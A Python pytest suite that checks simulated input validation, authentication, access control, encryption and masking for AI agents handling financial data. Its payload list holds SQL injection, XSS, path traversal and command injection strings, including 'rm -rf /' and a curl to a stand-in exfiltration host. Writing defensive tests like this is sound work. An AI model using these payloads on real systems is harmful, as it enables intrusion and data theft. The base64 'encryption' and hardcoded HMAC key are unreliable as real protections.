"""
Phase 6 Security Testing Suite
=============================

Comprehensive security testing for Phase 6 AI agents including:
- Input validation and sanitization
- Authentication and authorization
- Data encryption and protection
- SQL injection prevention
- Cross-site scripting (XSS) protection
- API security testing
- Sensitive data handling
- Agent communication security
- Financial data protection
- Access control validation
"""

import pytest
import asyncio
import json
import re
import hashlib
import base64
import time
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Tuple
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from dataclasses import dataclass
import logging
import secrets
import hmac
from pathlib import Path

# Configure security test logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Security test payloads and attack vectors
SECURITY_PAYLOADS = {
    'sql_injection': [
        "'; DROP TABLE agents; --",
        "' OR '1'='1",
        "admin'/**/OR/**/1=1#",
        "1' UNION SELECT null,username,password FROM users--",
        "'; INSERT INTO agents (name) VALUES ('malicious'); --",
        "' OR 1=1 OR ''='",
        "1'; UPDATE agents SET role='admin' WHERE id=1; --"
    ],
    'xss_payloads': [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "'><script>alert('xss')</script>",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "<<SCRIPT>alert('xss');//<</SCRIPT>"
    ],
    'command_injection': [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "`whoami`",
        "$(cat /etc/hosts)",
        "; nc -l -p 4444",
        "| curl evil-server.com/steal"
    ],
    'path_traversal': [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ],
    'ldap_injection': [
        "*)(uid=*",
        "*)(|(uid=*))",
        "*)(&(objectClass=*)",
        "*))%00",
        "admin)(&(password=*))",
        "*)(mail=*)"
    ],
    'nosql_injection': [
        "'; return true; var x='",
        "{$ne: null}",
        "{$regex: '.*'}",
        "{$where: 'function() { return true; }'}",
        "'; return db.getCollectionNames(); var x='"
    ]
}

SENSITIVE_DATA_PATTERNS = {
    'ssn': r'\b\d{3}-?\d{2}-?\d{4}\b',
    'credit_card': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
    'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
    'bank_account': r'\b\d{8,17}\b',
    'api_key': r'\b[A-Za-z0-9]{32,}\b'
}


@dataclass
class SecurityTestResult:
    """Security test result data structure"""
    test_name: str
    timestamp: datetime
    vulnerability_type: str
    payload_tested: str
    attack_blocked: bool
    security_measures_active: List[str]
    risk_level: str  # low, medium, high, critical
    recommendation: str
    additional_details: Dict[str, Any]


class SecurityTestFramework:
    """Security testing framework for Phase 6 components"""
    
    def __init__(self):
        self.test_results = []
        self.security_config = {
            'input_validation_enabled': True,
            'sql_injection_protection': True,
            'xss_protection': True,
            'csrf_protection': True,
            'rate_limiting': True,
            'authentication_required': True,
            'authorization_enforcement': True,
            'data_encryption': True,
            'audit_logging': True
        }
    
    async def test_input_validation(self, input_data: Any, expected_valid: bool = False) -> SecurityTestResult:
        """Test input validation mechanisms"""
        test_start = time.perf_counter()
        
        try:
            # Mock input validation system
            validation_result = await self._simulate_input_validation(input_data)
            
            # Determine if the attack was blocked
            attack_blocked = not validation_result.get('valid', False)
            
            # If we expected the input to be valid but it was blocked, that's good
            # If we expected it to be invalid and it wasn't blocked, that's bad
            security_effective = attack_blocked if not expected_valid else not attack_blocked
            
            result = SecurityTestResult(
                test_name='input_validation_test',
                timestamp=datetime.now(),
                vulnerability_type='input_validation',
                payload_tested=str(input_data)[:100],  # Truncate long payloads
                attack_blocked=attack_blocked,
                security_measures_active=['input_validation', 'sanitization'],
                risk_level='medium' if not security_effective else 'low',
                recommendation='Ensure all input is validated and sanitized' if not security_effective else 'Input validation working correctly',
                additional_details={
                    'validation_result': validation_result,
                    'execution_time': time.perf_counter() - test_start,
                    'input_type': type(input_data).__name__
                }
            )
            
            self.test_results.append(result)
            return result
            
        except Exception as e:
            result = SecurityTestResult(
                test_name='input_validation_test',
                timestamp=datetime.now(),
                vulnerability_type='input_validation',
                payload_tested=str(input_data)[:100],
                attack_blocked=True,  # Exception means it was blocked
                security_measures_active=['exception_handling'],
                risk_level='low',
                recommendation='Input validation through exception handling',
                additional_details={'error': str(e)}
            )
            
            self.test_results.append(result)
            return result
    
    async def _simulate_input_validation(self, input_data: Any) -> Dict[str, Any]:
        """Simulate input validation logic"""
        validation_rules = {
            'max_length': 1000,
            'allowed_characters': re.compile(r'^[a-zA-Z0-9\s\.,;:\-_@!?\(\)\[\]]+$'),
            'blocked_patterns': [
                r'<script.*?>.*?</script>',  # XSS
                r'(\'|\");?\s*(DROP|INSERT|UPDATE|DELETE|SELECT)',  # SQL injection
                r'(;|\||&|\$\(|\`)',  # Command injection
                r'\.\./',  # Path traversal
                r'\$ne|\$regex|\$where'  # NoSQL injection
            ]
        }
        
        input_str = str(input_data)
        
        # Check length
        if len(input_str) > validation_rules['max_length']:
            return {'valid': False, 'reason': 'exceeds_max_length'}
        
        # Check for blocked patterns
        for pattern in validation_rules['blocked_patterns']:
            if re.search(pattern, input_str, re.IGNORECASE):
                return {'valid': False, 'reason': 'contains_blocked_pattern', 'pattern': pattern}
        
        # Check allowed characters (relaxed for normal operation)
        if len(input_str) > 0 and not validation_rules['allowed_characters'].match(input_str):
            # Allow some special cases but flag suspicious ones
            if any(payload in input_str for payload_list in SECURITY_PAYLOADS.values() for payload in payload_list):
                return {'valid': False, 'reason': 'suspicious_pattern_detected'}
        
        return {'valid': True, 'sanitized': input_str}
    
    async def test_authentication_bypass(self, username: str, password: str) -> SecurityTestResult:
        """Test authentication bypass attempts"""
        test_start = time.perf_counter()
        
        # Common authentication bypass attempts
        bypass_attempts = [
            ('admin', 'admin'),
            ('administrator', ''),
            ('', ''),
            ('admin', "' OR '1'='1"),
            ('admin', 'password'),
            ('root', 'root'),
            ('test', 'test')
        ]
        
        auth_result = await self._simulate_authentication(username, password)
        
        # Check if this looks like a bypass attempt
        is_bypass_attempt = (username, password) in bypass_attempts or any(
            payload in password for payload_list in SECURITY_PAYLOADS.values() for payload in payload_list
        )
        
        attack_blocked = not auth_result.get('authenticated', False)
        
        result = SecurityTestResult(
            test_name='authentication_bypass_test',
            timestamp=datetime.now(),
            vulnerability_type='authentication_bypass',
            payload_tested=f"username: {username}, password: [REDACTED]",
            attack_blocked=attack_blocked,
            security_measures_active=['authentication', 'rate_limiting'],
            risk_level='critical' if not attack_blocked and is_bypass_attempt else 'low',
            recommendation='Ensure strong authentication mechanisms' if not attack_blocked else 'Authentication working correctly',
            additional_details={
                'auth_result': auth_result,
                'is_bypass_attempt': is_bypass_attempt,
                'execution_time': time.perf_counter() - test_start
            }
        )
        
        self.test_results.append(result)
        return result
    
    async def _simulate_authentication(self, username: str, password: str) -> Dict[str, Any]:
        """Simulate authentication system"""
        # Mock user database
        valid_users = {
            'admin': 'secure_password_hash_12345',
            'user1': 'user_password_hash_67890',
            'testuser': 'test_password_hash_abcdef'
        }
        
        # Check for SQL injection patterns
        if any(payload in username or payload in password 
               for payload in SECURITY_PAYLOADS['sql_injection']):
            return {'authenticated': False, 'reason': 'sql_injection_detected'}
        
        # Check rate limiting (simulated)
        if username == 'admin' and password == 'admin':
            # Simulate too many attempts
            return {'authenticated': False, 'reason': 'rate_limited'}
        
        # Simulate proper authentication
        if username in valid_users:
            # In real implementation, would hash the password and compare
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            if password_hash == valid_users[username]:
                return {'authenticated': True, 'user_id': username}
        
        return {'authenticated': False, 'reason': 'invalid_credentials'}
    
    async def test_authorization_enforcement(self, user_role: str, requested_resource: str, action: str) -> SecurityTestResult:
        """Test authorization and access control"""
        test_start = time.perf_counter()
        
        access_result = await self._simulate_authorization(user_role, requested_resource, action)
        
        # Define expected access patterns
        expected_access = self._get_expected_access(user_role, requested_resource, action)
        authorization_working = access_result.get('authorized', False) == expected_access
        
        result = SecurityTestResult(
            test_name='authorization_enforcement_test',
            timestamp=datetime.now(),
            vulnerability_type='authorization_bypass',
            payload_tested=f"role: {user_role}, resource: {requested_resource}, action: {action}",
            attack_blocked=not access_result.get('authorized', False) if not expected_access else True,
            security_measures_active=['rbac', 'access_control'],
            risk_level='high' if not authorization_working else 'low',
            recommendation='Review access control policies' if not authorization_working else 'Authorization working correctly',
            additional_details={
                'access_result': access_result,
                'expected_access': expected_access,
                'authorization_working': authorization_working,
                'execution_time': time.perf_counter() - test_start
            }
        )
        
        self.test_results.append(result)
        return result
    
    def _get_expected_access(self, user_role: str, resource: str, action: str) -> bool:
        """Define expected access patterns based on role"""
        access_matrix = {
            'admin': {'*': ['create', 'read', 'update', 'delete']},
            'financial_analyst': {
                'financial_data': ['read', 'update'],
                'reports': ['create', 'read'],
                'transactions': ['read']
            },
            'user': {
                'own_data': ['read', 'update'],
                'reports': ['read']
            },
            'guest': {
                'public_data': ['read']
            }
        }
        
        if user_role in access_matrix:
            role_permissions = access_matrix[user_role]
            
            # Check wildcard permissions
            if '*' in role_permissions and action in role_permissions['*']:
                return True
            
            # Check specific resource permissions
            if resource in role_permissions and action in role_permissions[resource]:
                return True
        
        return False
    
    async def _simulate_authorization(self, user_role: str, resource: str, action: str) -> Dict[str, Any]:
        """Simulate authorization system"""
        expected_access = self._get_expected_access(user_role, resource, action)
        
        # Simulate authorization check
        return {
            'authorized': expected_access,
            'user_role': user_role,
            'resource': resource,
            'action': action,
            'timestamp': datetime.now()
        }
    
    async def test_data_encryption(self, sensitive_data: str) -> SecurityTestResult:
        """Test data encryption and protection"""
        test_start = time.perf_counter()
        
        # Test encryption
        encrypted_data = await self._simulate_encryption(sensitive_data)
        
        # Test decryption
        decrypted_data = await self._simulate_decryption(encrypted_data)
        
        # Verify encryption is working
        encryption_working = (
            encrypted_data != sensitive_data and
            decrypted_data == sensitive_data and
            len(encrypted_data) > len(sensitive_data)
        )
        
        # Check for sensitive data patterns in encrypted form
        sensitive_data_exposed = any(
            re.search(pattern, encrypted_data, re.IGNORECASE)
            for pattern in SENSITIVE_DATA_PATTERNS.values()
        )
        
        result = SecurityTestResult(
            test_name='data_encryption_test',
            timestamp=datetime.now(),
            vulnerability_type='data_exposure',
            payload_tested='[ENCRYPTED_DATA]',
            attack_blocked=encryption_working and not sensitive_data_exposed,
            security_measures_active=['encryption', 'data_protection'],
            risk_level='critical' if not encryption_working or sensitive_data_exposed else 'low',
            recommendation='Ensure all sensitive data is properly encrypted' if not encryption_working else 'Encryption working correctly',
            additional_details={
                'encryption_working': encryption_working,
                'sensitive_data_exposed': sensitive_data_exposed,
                'encrypted_length': len(encrypted_data),
                'original_length': len(sensitive_data),
                'execution_time': time.perf_counter() - test_start
            }
        )
        
        self.test_results.append(result)
        return result
    
    async def _simulate_encryption(self, data: str) -> str:
        """Simulate data encryption"""
        # Simple base64 encoding for simulation (in real implementation, use proper encryption)
        key = secrets.token_bytes(32)
        
        # Simulate AES encryption by encoding with key
        encoded_data = base64.b64encode(data.encode() + key[:16]).decode()
        return f"ENC:{encoded_data}"
    
    async def _simulate_decryption(self, encrypted_data: str) -> str:
        """Simulate data decryption"""
        if not encrypted_data.startswith("ENC:"):
            raise ValueError("Invalid encrypted data format")
        
        encoded_data = encrypted_data[4:]  # Remove "ENC:" prefix
        decoded_bytes = base64.b64decode(encoded_data)
        
        # Remove the key bytes (last 16 bytes) and decode
        original_data = decoded_bytes[:-16].decode()
        return original_data


class TestInputValidationSecurity:
    """Test input validation security measures"""
    
    @pytest.fixture
    def security_framework(self):
        """Create security testing framework"""
        return SecurityTestFramework()
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_sql_injection_protection(self, security_framework):
        """Test SQL injection protection"""
        results = []
        
        for payload in SECURITY_PAYLOADS['sql_injection']:
            result = await security_framework.test_input_validation(payload)
            results.append(result)
        
        # All SQL injection attempts should be blocked
        blocked_attempts = [r for r in results if r.attack_blocked]
        success_rate = len(blocked_attempts) / len(results)
        
        assert success_rate >= 0.95, f"SQL injection protection too low: {success_rate:.1%}"
        assert all(r.risk_level in ['low', 'medium'] for r in blocked_attempts), "Some high-risk attacks not blocked"
        
        logger.info(f"SQL injection protection: {success_rate:.1%} of attacks blocked")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_xss_protection(self, security_framework):
        """Test cross-site scripting protection"""
        results = []
        
        for payload in SECURITY_PAYLOADS['xss_payloads']:
            result = await security_framework.test_input_validation(payload)
            results.append(result)
        
        # All XSS attempts should be blocked
        blocked_attempts = [r for r in results if r.attack_blocked]
        success_rate = len(blocked_attempts) / len(results)
        
        assert success_rate >= 0.90, f"XSS protection too low: {success_rate:.1%}"
        
        logger.info(f"XSS protection: {success_rate:.1%} of attacks blocked")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_command_injection_protection(self, security_framework):
        """Test command injection protection"""
        results = []
        
        for payload in SECURITY_PAYLOADS['command_injection']:
            result = await security_framework.test_input_validation(payload)
            results.append(result)
        
        blocked_attempts = [r for r in results if r.attack_blocked]
        success_rate = len(blocked_attempts) / len(results)
        
        assert success_rate >= 0.85, f"Command injection protection too low: {success_rate:.1%}"
        
        logger.info(f"Command injection protection: {success_rate:.1%} of attacks blocked")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_path_traversal_protection(self, security_framework):
        """Test path traversal protection"""
        results = []
        
        for payload in SECURITY_PAYLOADS['path_traversal']:
            result = await security_framework.test_input_validation(payload)
            results.append(result)
        
        blocked_attempts = [r for r in results if r.attack_blocked]
        success_rate = len(blocked_attempts) / len(results)
        
        assert success_rate >= 0.90, f"Path traversal protection too low: {success_rate:.1%}"
        
        logger.info(f"Path traversal protection: {success_rate:.1%} of attacks blocked")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_valid_input_acceptance(self, security_framework):
        """Test that valid inputs are not blocked"""
        valid_inputs = [
            "Process financial report for Q4 2024",
            "user@company.com",
            "Transaction amount: $1,500.00",
            "Agent task: analyze data trends",
            "Customer ID: CUST-12345",
            "Report generated on 2024-01-15"
        ]
        
        results = []
        for valid_input in valid_inputs:
            result = await security_framework.test_input_validation(valid_input, expected_valid=True)
            results.append(result)
        
        # Valid inputs should not be blocked
        accepted_inputs = [r for r in results if not r.attack_blocked]
        acceptance_rate = len(accepted_inputs) / len(results)
        
        assert acceptance_rate >= 0.90, f"Valid input acceptance too low: {acceptance_rate:.1%}"
        
        logger.info(f"Valid input acceptance: {acceptance_rate:.1%} of valid inputs accepted")


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    @pytest.fixture
    def security_framework(self):
        return SecurityTestFramework()
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_authentication_bypass_attempts(self, security_framework):
        """Test authentication bypass protection"""
        bypass_attempts = [
            ('admin', 'admin'),
            ('administrator', ''),
            ('', ''),
            ('admin', "' OR '1'='1"),
            ('admin', 'password'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', ''),
            ('admin', '123456')
        ]
        
        results = []
        for username, password in bypass_attempts:
            result = await security_framework.test_authentication_bypass(username, password)
            results.append(result)
        
        # All bypass attempts should be blocked
        blocked_attempts = [r for r in results if r.attack_blocked]
        protection_rate = len(blocked_attempts) / len(results)
        
        assert protection_rate >= 0.95, f"Authentication bypass protection too low: {protection_rate:.1%}"
        
        critical_failures = [r for r in results if r.risk_level == 'critical' and not r.attack_blocked]
        assert len(critical_failures) == 0, f"Critical authentication bypass vulnerabilities detected: {len(critical_failures)}"
        
        logger.info(f"Authentication bypass protection: {protection_rate:.1%} of attempts blocked")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_authorization_enforcement(self, security_framework):
        """Test role-based access control"""
        access_tests = [
            # (role, resource, action, should_be_allowed)
            ('admin', 'financial_data', 'delete', True),
            ('financial_analyst', 'financial_data', 'read', True),
            ('financial_analyst', 'user_accounts', 'delete', False),
            ('user', 'own_data', 'read', True),
            ('user', 'admin_panel', 'read', False),
            ('guest', 'public_data', 'read', True),
            ('guest', 'financial_data', 'read', False),
            ('', 'any_resource', 'read', False)  # No role
        ]
        
        results = []
        for role, resource, action, expected_allowed in access_tests:
            result = await security_framework.test_authorization_enforcement(role, resource, action)
            results.append(result)
        
        # Check authorization accuracy
        correct_authorizations = [r for r in results if r.additional_details['authorization_working']]
        accuracy = len(correct_authorizations) / len(results)
        
        assert accuracy >= 0.95, f"Authorization accuracy too low: {accuracy:.1%}"
        
        # Check for privilege escalation attempts
        escalation_attempts = [r for r in results if r.risk_level == 'high' and not r.attack_blocked]
        assert len(escalation_attempts) == 0, f"Privilege escalation vulnerabilities: {len(escalation_attempts)}"
        
        logger.info(f"Authorization accuracy: {accuracy:.1%}")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_session_security(self, security_framework):
        """Test session management security"""
        # Mock session tests
        session_tests = [
            {
                'session_id': 'valid_session_12345',
                'user_id': 'user1',
                'expires': datetime.now() + timedelta(hours=1),
                'should_be_valid': True
            },
            {
                'session_id': 'expired_session_67890',
                'user_id': 'user2',
                'expires': datetime.now() - timedelta(hours=1),
                'should_be_valid': False
            },
            {
                'session_id': 'malicious_session_<script>',
                'user_id': 'attacker',
                'expires': datetime.now() + timedelta(hours=1),
                'should_be_valid': False
            }
        ]
        
        validation_results = []
        for session_test in session_tests:
            # Simulate session validation
            is_valid = await self._validate_session(session_test)
            
            validation_correct = is_valid == session_test['should_be_valid']
            validation_results.append(validation_correct)
        
        accuracy = sum(validation_results) / len(validation_results)
        assert accuracy >= 0.95, f"Session validation accuracy too low: {accuracy:.1%}"
        
        logger.info(f"Session validation accuracy: {accuracy:.1%}")
    
    async def _validate_session(self, session_data: Dict[str, Any]) -> bool:
        """Simulate session validation"""
        # Check for malicious patterns in session ID
        if re.search(r'[<>"\']', session_data['session_id']):
            return False
        
        # Check expiration
        if session_data['expires'] < datetime.now():
            return False
        
        # Check session ID format
        if not re.match(r'^[a-zA-Z0-9_]{10,50}$', session_data['session_id']):
            return False
        
        return True


class TestDataProtectionSecurity:
    """Test data protection and encryption security"""
    
    @pytest.fixture
    def security_framework(self):
        return SecurityTestFramework()
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_sensitive_data_encryption(self, security_framework):
        """Test encryption of sensitive data"""
        sensitive_data_samples = [
            "123-45-6789",  # SSN
            "4532-1234-5678-9012",  # Credit card
            "user@company.com",  # Email
            "555-123-4567",  # Phone
            "Account: 1234567890123456",  # Bank account
            "API_KEY_abcdef123456789"  # API key
        ]
        
        encryption_results = []
        for data in sensitive_data_samples:
            result = await security_framework.test_data_encryption(data)
            encryption_results.append(result)
        
        # All sensitive data should be properly encrypted
        properly_encrypted = [r for r in encryption_results if r.attack_blocked]
        encryption_rate = len(properly_encrypted) / len(encryption_results)
        
        assert encryption_rate >= 0.95, f"Data encryption rate too low: {encryption_rate:.1%}"
        
        # No critical vulnerabilities should exist
        critical_issues = [r for r in encryption_results if r.risk_level == 'critical']
        assert len(critical_issues) == 0, f"Critical encryption vulnerabilities: {len(critical_issues)}"
        
        logger.info(f"Data encryption rate: {encryption_rate:.1%}")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_sensitive_data_detection(self, security_framework):
        """Test detection of sensitive data patterns"""
        test_strings = [
            "User SSN: 123-45-6789 should be protected",
            "Credit card 4532-1234-5678-9012 found in logs",
            "Contact email: user@company.com for details",
            "Phone number 555-123-4567 in database",
            "Normal text without sensitive information",
            "API key: sk_test_abcdef123456789 exposed"
        ]
        
        detection_results = []
        for test_string in test_strings:
            detected_patterns = []
            for pattern_name, pattern_regex in SENSITIVE_DATA_PATTERNS.items():
                if re.search(pattern_regex, test_string):
                    detected_patterns.append(pattern_name)
            
            detection_results.append({
                'text': test_string,
                'patterns_detected': detected_patterns,
                'has_sensitive_data': len(detected_patterns) > 0
            })
        
        # Verify sensitive data is detected
        texts_with_sensitive = [r for r in detection_results if r['has_sensitive_data']]
        texts_without_sensitive = [r for r in detection_results if not r['has_sensitive_data']]
        
        assert len(texts_with_sensitive) >= 5, "Should detect most sensitive data patterns"
        assert len(texts_without_sensitive) >= 1, "Should not flag normal text"
        
        logger.info(f"Sensitive data detection: {len(texts_with_sensitive)}/{len(detection_results)} texts flagged")
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_data_masking(self, security_framework):
        """Test data masking for logs and outputs"""
        sensitive_inputs = [
            ("Credit card: 4532-1234-5678-9012", "Credit card: 4532-****-****-9012"),
            ("SSN: 123-45-6789", "SSN: ***-**-6789"),
            ("Email: user@company.com", "Email: u***@company.com"),
            ("Phone: 555-123-4567", "Phone: 555-***-4567"),
            ("API Key: sk_test_12345abcdef", "API Key: sk_***************"),
        ]
        
        masking_results = []
        for original, expected_masked in sensitive_inputs:
            masked = await self._simulate_data_masking(original)
            
            masking_correct = (
                masked != original and  # Should be different from original
                len(masked) <= len(original) + 5 and  # Should not be much longer
                '***' in masked or '****' in masked  # Should contain masking characters
            )
            
            masking_results.append({
                'original': original,
                'masked': masked,
                'expected': expected_masked,
                'correct': masking_correct
            })
        
        correct_maskings = [r for r in masking_results if r['correct']]
        masking_accuracy = len(correct_maskings) / len(masking_results)
        
        assert masking_accuracy >= 0.80, f"Data masking accuracy too low: {masking_accuracy:.1%}"
        
        logger.info(f"Data masking accuracy: {masking_accuracy:.1%}")
    
    async def _simulate_data_masking(self, text: str) -> str:
        """Simulate data masking for sensitive information"""
        masked_text = text
        
        # Mask credit card numbers
        masked_text = re.sub(r'\b(\d{4})-(\d{4})-(\d{4})-(\d{4})\b', r'\1-****-****-\4', masked_text)
        
        # Mask SSNs
        masked_text = re.sub(r'\b(\d{3})-(\d{2})-(\d{4})\b', r'***-**-\3', masked_text)
        
        # Mask emails
        masked_text = re.sub(r'\b([a-zA-Z])[a-zA-Z0-9._%+-]*@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\b', r'\1***@\2', masked_text)
        
        # Mask phone numbers
        masked_text = re.sub(r'\b(\d{3})-(\d{3})-(\d{4})\b', r'\1-***-\3', masked_text)
        
        # Mask API keys
        masked_text = re.sub(r'\b(sk_[a-zA-Z0-9]{2,}[a-zA-Z0-9]{6})\b', r'sk_***************', masked_text)
        
        return masked_text


class TestAgentCommunicationSecurity:
    """Test security of inter-agent communications"""
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_agent_message_encryption(self):
        """Test encryption of messages between agents"""
        test_messages = [
            {
                'from_agent': 'financial_agent_001',
                'to_agent': 'audit_agent_002',
                'message_type': 'financial_data',
                'content': {'transactions': [{'amount': 15000, 'account': '12345'}]},
                'classification': 'sensitive'
            },
            {
                'from_agent': 'coordinator_001',
                'to_agent': 'worker_agent_003',
                'message_type': 'task_assignment',
                'content': {'task_id': 'task_123', 'priority': 'high'},
                'classification': 'internal'
            }
        ]
        
        for message in test_messages:
            encrypted_message = await self._simulate_agent_message_encryption(message)
            
            # Verify message is encrypted
            assert 'encrypted_content' in encrypted_message
            assert 'signature' in encrypted_message
            assert encrypted_message['encrypted_content'] != str(message['content'])
            
            # Verify sensitive data is not exposed in encrypted message
            if message['classification'] == 'sensitive':
                assert '15000' not in str(encrypted_message)
                assert '12345' not in str(encrypted_message)
            
            logger.info(f"Agent message encrypted successfully: {message['message_type']}")
    
    async def _simulate_agent_message_encryption(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Simulate agent message encryption"""
        content_str = json.dumps(message['content'])
        
        # Simulate encryption (base64 for demo)
        encrypted_content = base64.b64encode(content_str.encode()).decode()
        
        # Simulate digital signature
        message_hash = hashlib.sha256(content_str.encode()).hexdigest()
        signature = hmac.new(b'secret_key', message_hash.encode(), hashlib.sha256).hexdigest()
        
        return {
            'from_agent': message['from_agent'],
            'to_agent': message['to_agent'],
            'message_type': message['message_type'],
            'encrypted_content': encrypted_content,
            'signature': signature,
            'timestamp': datetime.now().isoformat()
        }
    
    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_agent_identity_verification(self):
        """Test agent identity verification"""
        agent_identities = [
            {'agent_id': 'financial_agent_001', 'public_key': 'pk_12345abcdef', 'valid': True},
            {'agent_id': 'audit_agent_002', 'public_key': 'pk_67890ghijkl', 'valid': True},
            {'agent_id': 'malicious_agent', 'public_key': 'pk_fakekeyhere', 'valid': False},
            {'agent_id': 'coordinator_001', 'public_key': '', 'valid': False}  # Missing key
        ]
        
        verification_results = []
        for identity in agent_identities:
            is_verified = await self._simulate_agent_verification(identity)
            
            verification_correct = is_verified == identity['valid']
            verification_results.append(verification_correct)
        
        accuracy = sum(verification_results) / len(verification_results)
        assert accuracy >= 0.95, f"Agent verification accuracy too low: {accuracy:.1%}"
        
        logger.info(f"Agent identity verification accuracy: {accuracy:.1%}")
    
    async def _simulate_agent_verification(self, identity: Dict[str, Any]) -> bool:
        """Simulate agent identity verification"""
        # Mock certificate authority with known valid public keys
        valid_public_keys = {
            'financial_agent_001': 'pk_12345abcdef',
            'audit_agent_002': 'pk_67890ghijkl',
            'coordinator_001': 'pk_mnopqr123456'
        }
        
        agent_id = identity['agent_id']
        public_key = identity['public_key']
        
        # Check if agent is in registry and key matches
        if agent_id in valid_public_keys and valid_public_keys[agent_id] == public_key:
            return True
        
        return False


def generate_security_report(test_results: List[SecurityTestResult]) -> str:
    """Generate comprehensive security test report"""
    if not test_results:
        return "No security test results available"
    
    # Analyze results by risk level
    risk_summary = {'low': 0, 'medium': 0, 'high': 0, 'critical': 0}
    for result in test_results:
        risk_summary[result.risk_level] += 1
    
    # Count blocked vs unblocked attacks
    attacks_blocked = sum(1 for r in test_results if r.attack_blocked)
    total_attacks = len(test_results)
    protection_rate = attacks_blocked / total_attacks if total_attacks > 0 else 0
    
    report_lines = [
        "=" * 80,
        "PHASE 6 SECURITY TESTING REPORT",
        "=" * 80,
        f"Test Execution Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Total Security Tests: {total_attacks}",
        f"Attacks Blocked: {attacks_blocked}",
        f"Overall Protection Rate: {protection_rate:.1%}",
        "",
        "RISK LEVEL SUMMARY:",
        "-" * 25,
        f"Critical Risks: {risk_summary['critical']}",
        f"High Risks: {risk_summary['high']}",
        f"Medium Risks: {risk_summary['medium']}",
        f"Low Risks: {risk_summary['low']}",
        "",
        "VULNERABILITY TYPES TESTED:",
        "-" * 30
    ]
    
    # Group by vulnerability type
    vuln_types = {}
    for result in test_results:
        vuln_type = result.vulnerability_type
        if vuln_type not in vuln_types:
            vuln_types[vuln_type] = {'total': 0, 'blocked': 0}
        vuln_types[vuln_type]['total'] += 1
        if result.attack_blocked:
            vuln_types[vuln_type]['blocked'] += 1
    
    for vuln_type, stats in vuln_types.items():
        protection_rate = stats['blocked'] / stats['total'] if stats['total'] > 0 else 0
        report_lines.append(f"{vuln_type}: {protection_rate:.1%} ({stats['blocked']}/{stats['total']})")
    
    report_lines.extend([
        "",
        "SECURITY RECOMMENDATIONS:",
        "-" * 25
    ])
    
    # Add unique recommendations
    recommendations = set()
    for result in test_results:
        if result.risk_level in ['high', 'critical'] and not result.attack_blocked:
            recommendations.add(result.recommendation)
    
    if recommendations:
        for rec in sorted(recommendations):
            report_lines.append(f"• {rec}")
    else:
        report_lines.append("• No critical security issues detected")
    
    report_lines.extend([
        "",
        "=" * 80
    ])
    
    return "\n".join(report_lines)


if __name__ == "__main__":
    # Run security tests
    pytest.main([
        __file__, 
        "-v", 
        "-m", "security",
        "--tb=short"
    ])